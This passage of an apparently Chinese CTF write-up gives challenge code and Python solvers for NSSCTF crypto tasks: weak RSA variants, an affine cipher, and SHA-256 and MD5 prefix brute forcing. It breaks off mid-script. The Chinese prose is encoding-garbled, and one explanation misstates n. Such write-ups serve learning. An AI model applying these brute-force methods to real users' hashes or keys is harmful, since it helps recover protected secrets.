class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line">p=<span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q=<span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="çˆ±å¦ƒ"><a href="#çˆ±å¦ƒ" class="headerlink" title="çˆ±å¦ƒ"></a>çˆ±å¦ƒ</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message,a,b,m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(i*a+b)%m <span class="keyword">for</span> i <span class="keyword">in</span> message])</span><br><span class="line"></span><br><span class="line">a,b = getrandbits(<span class="number">4</span>),getrandbits(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;encrypt(flag,a,b,<span class="number">1</span>&lt;&lt;<span class="number">8</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç«Ÿç„¶å·²ç»çŸ¥é“æ˜æ–‡çš„å½¢å¼æ˜¯NSSCTF{æˆ–è€…nssctf{ï¼Œå…ˆçˆ†ç ´a,bï¼Œgetrandbits(n)æ˜¯è·å¾—ä¸€ä¸ªåœ¨0-2^nä¹‹é—´çš„éšæœºæ•°ï¼Œç›´æ¥åšå­—å…¸çˆ†ç ´ã€‚aï¼Œbå‡ºæ¥åçˆ†ç ´flagå³å¯ã€‚</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line">  </span><br><span class="line">ls1 = []</span><br><span class="line">ls2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">ls1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">ls2.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">cipher = <span class="string">b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> ls1: <span class="comment">#çˆ†ç ´aå’Œb</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> ls2:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            <span class="keyword">if</span> (a*flag[i] + b) % <span class="number">0x100</span> == cipher[i]:</span><br><span class="line">                s += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">print</span>(a,b)</span><br><span class="line">            <span class="comment">#13 131</span></span><br><span class="line">a,b = <span class="number">13</span>,<span class="number">131</span></span><br><span class="line">table = string.printable.encode() <span class="comment">#å–asciiè¡¨</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table: <span class="comment">#çˆ†ç ´flag</span></span><br><span class="line">        <span class="keyword">if</span> (a*i + b)%<span class="number">0x100</span> == c:</span><br><span class="line">            res += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(res)   </span><br></pre></td></tr></table></figure><h2 id="RSA-again"><a href="#RSA-again" class="headerlink" title="RSA again"></a>RSA again</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> x:x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>))</span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = getPrime(<span class="number">1024</span>)</span><br><span class="line">s = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n1 = p*q</span><br><span class="line">n2 = r*s</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x3</span></span><br><span class="line">e2 = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n1 = <span class="subst">&#123;n1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333</span></span><br><span class="line"><span class="string">n2 = 16329690193309629244191723145720681753145067517963214005637012320130767690248475184382159868590994476900972592910808281306311987027465355492106975220876976952805197358639881107619560544543352300924359258546945240852850094015390140482140815264345348655887196971643211396274684514779113163628885090661524523232327450873503097327714815509514869056066300689707819915660849896274673178482085029145101175879255721581466301617903290840675945809027289325795423671263820619585424051649443606301277124322653881307702397752575258862656767834175467463999624688529625582031941402015943516022965802189663157681884162493551612612033</span></span><br><span class="line"><span class="string">e1 = 3</span></span><br><span class="line"><span class="string">e2 = 65537</span></span><br><span class="line"><span class="string">c1 = 1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125</span></span><br><span class="line"><span class="string">c2 = 13118485959563304540673377439664643422000629435115361166348221705991314239675693340024813013156594762061646798463551395329521013651893257141697813554253378348002502855822191264845788826850528723400519059095869424931054523865083127809240502348046515579012160733570975234405522250330692499687684922633627550243811524972452606330768418753137605045204137872122584136368073471612976975360656501198000053578279110813009137808852376287556012668702182416374333935081007133880603708035832346742292444210108820267460698390600228183548619401334969739679892562475501201965275739796687679445529050630235296740377171065357995433586</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„çš„æ˜¯e1=3å¾ˆå°ï¼Œä½åŠ å¯†æŒ‡æ•°æ”»å‡»ã€‚</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">n= <span class="number">19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333</span></span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">c= <span class="number">1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125</span></span><br><span class="line"></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h2 id="strange-RSA"><a href="#strange-RSA" class="headerlink" title="strange RSA"></a>strange RSA</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> x:x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>))</span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">n = p*p*q*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761</span></span><br><span class="line"><span class="string">c = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯<code>n=p*p*p*q</code>æ ¹æ®æ¬§æ‹‰å®šç†å¯ä»¥å¾—åˆ°æ¬§æ‹‰å‡½æ•°<code>phi = p*(p-1)*q*(q - 1)</code>ã€‚nç›´æ¥factorçˆ†ç ´å°±èƒ½å‡ºpï¼Œqã€‚</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761</span></span><br><span class="line">c = <span class="number">269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">709662686105519282917793669093</span> </span><br><span class="line">q = <span class="number">1058314117179226194777612760717</span></span><br><span class="line">phi = p*(p-<span class="number">1</span>)*q*(q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="solve-the-equation"><a href="#solve-the-equation" class="headerlink" title="solve_the_equation"></a>solve_the_equation</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">gift = <span class="number">2022</span> * p + <span class="number">9</span> * q + <span class="number">28</span> * e</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n,c,gift)</span><br><span class="line"><span class="comment"># 559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797</span></span><br><span class="line"><span class="comment"># 73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925</span></span><br><span class="line"><span class="comment"># 63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§£æ–¹ç¨‹ï¼Œç›´æ¥sympyåº“è§£éçº¿æ€§æ–¹ç¨‹ç»„ï¼Œæœ‰ä¿©è§£ï¼Œå–æ•´æ•°è§£é‚£ä¸ªå³å¯ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797</span></span><br><span class="line">c = <span class="number">73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925</span></span><br><span class="line">gift = <span class="number">63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p,q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">resture = nonlinsolve([p*q - n, <span class="number">2022</span> * p + <span class="number">9</span> * q + <span class="number">28</span> * e - gift], [p, q])</span><br><span class="line"><span class="built_in">print</span>(resture)</span><br></pre></td></tr></table></figure><p>pï¼Œqå‡ºäº†ï¼ŒRSAä¸€æŠŠæ¢­å°±è¡Œäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 31488299927163782375594305784598354985055343576902151378139638110290196067918972709864013036909993584566357500427488971564319756822589646977081872239028723217808372250207143372686512583814138881980368846428364451724191019810210583450208745323418623199057207740178726519465136933610452840086315545766227500114368026151391214297362847972215483754128409704386255997220347329566039222555930464490406419002226257326118774942404683970363544788642504594073256844610344691049585870560973659315882902006631997716334351866723219577903275769313404136367236735062099234386473703566068495328080598914833401280780692803508570349879</span><br><span class="line">q = 17753062588733343270481973113408741177364273466266578137604693537521130628067514464616655876995871735360322066932727884076111196635241747675042626304508770586691927800281585936137657405193182456402216484778567926375452998098111716574027285177466244350043079827469560084278792340806640810521556665260999347942843603815228875925103340718552529438783648172063716949726071718858811605089496505238883332792493647818670062684514188459512366295227468596668231188353669195967903222039580635681985850471261694526218866731687175727118621937360285536800367141087950091875609247828705723374310716178275472084635608436063660110043</span><br></pre></td></tr></table></figure><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><p><img src="https://s2.loli.net/2023/08/04/wneuaFGNLryWcEi.png" alt="image-20221021105716950.png"></p><p>sha256çˆ†ç ´å‰å››ä½ã€‚</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet=digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sha256=<span class="string">&quot;1dafe94b2a853521de7c2ef475c88dc446b9a92b67189d4f0905ecad71b2acef&quot;</span></span><br><span class="line">tail=<span class="string">&quot;aW56dn5niWISJkBo&quot;</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha=hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha==<span class="built_in">str</span>(sha256)):</span><br><span class="line">        xxxx=data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure><h2 id="md5å¤ªæ®‹æš´äº†"><a href="#md5å¤ªæ®‹æš´äº†" class="headerlink" title="md5å¤ªæ®‹æš´äº†"></a>md5å¤ªæ®‹æš´äº†</h2><p>é¢˜ç›®æè¿°ï¼š</p><p>å°æ˜å…»æˆäº†å®šæœŸä¿®æ”¹å¯†ç çš„å¥½ä¹ æƒ¯ï¼ŒåŒæ—¶ï¼Œä»–è¿˜æ˜¯ä¸€ä¸ªCTFçˆ±å¥½è€…ã€‚æœ‰ä¸€å¤©ï¼Œä»–çªå‘å¥‡æƒ³ï¼Œç”¨flagæ ¼å¼æ¥è®¾ç½®å¯†ç ï¼Œä¸ºäº†é˜²æ­¢å¿˜è®°å¯†ç ï¼Œä»–è¿˜æŠŠå¯†ç è¿›è¡Œäº†md5åŠ å¯†ã€‚ä¸ºäº†é¿å…è¢«å…¶ä»–äººçœ‹åˆ°å…¨éƒ¨å¯†ç ï¼Œä»–è¿˜ç‰¹æ„ä¿®æ”¹äº†å…¶ä¸­éƒ¨åˆ†å­—ç¬¦ä¸º#ã€‚ä½ èƒ½çŒœå‡ºä»–çš„å¯†ç å—ï¼Ÿ<br>plaintext = flag<br>md5 = ac7f4d52c3924925aa9c8a7a1f522451<br>PS: ç¬¬ä¸€ä¸ª#æ˜¯å¤§å†™å­—æ¯ï¼Œç¬¬äºŒä¸ª#æ˜¯å°å†™å­—æ¯ï¼Œå…¶ä»–æ˜¯æ•°å­—ã€‚</p><p>md5çˆ†ç ´ã€‚</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">plaintext = <span class="string">&quot;flag&#123;#00#_P4ssw0rd_N3v3r_F0rg3t_63####&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">Dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>)] <span class="comment">#å°å†™å­—æ¯</span></span><br><span class="line">dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>)] <span class="comment">#å¤§å†™å­—æ¯</span></span><br><span class="line">num = [<span class="string">&#x27;0&#x27;</span>, <span 